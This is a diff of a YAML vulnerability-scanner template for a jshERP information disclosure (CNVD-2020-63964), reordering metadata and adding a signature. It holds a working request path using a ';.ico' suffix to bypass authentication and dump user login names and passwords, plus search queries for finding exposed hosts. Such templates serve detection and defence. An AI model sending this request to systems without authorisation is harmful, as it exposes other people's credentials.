@@ -1,5 +1,4 @@
 id: CNVD-2020-63964
-
 info:
   name: jshERP - Information Disclosure
   author: brucelsone
@@ -11,18 +10,16 @@ info:
   classification:
     cpe: cpe:2.3:a:jishenghua:jsherp:*:*:*:*:*:*:*:*
   metadata:
+    fofa-query: jshERP-boot
     max-request: 1
-    vendor: jishenghua
     product: jsherp
     shodan-query: http.favicon.hash:-1298131932
-    fofa-query: jshERP-boot
-  tags: cnvd,cnvd2020,jsherp,disclosure,vuln
-
+    vendor: jishenghua
+  tags: cnvd,cnvd2020,disclosure,jsherp,vuln
 http:
   - method: GET
     path:
       - "{{BaseURL}}/jshERP-boot/user/getAllList;.ico"
-
     matchers-condition: and
     matchers:
       - type: word
@@ -31,13 +28,11 @@ http:
           - '"loginName":'
           - '"password":'
         condition: and
-
       - type: word
         part: header
         words:
           - "application/json"
-
       - type: status
         status:
           - 200
-
+        # digest: 4a0a0047304502206a91575b65731323746b5d8065473e6ea03b9932ba4b1f099afae9813052178d022100b6241d7329741ae9075318a53acd93bec05285d5c004e29ea9026283f7dc5122:922c64590222798bb761d5b6d8e72950
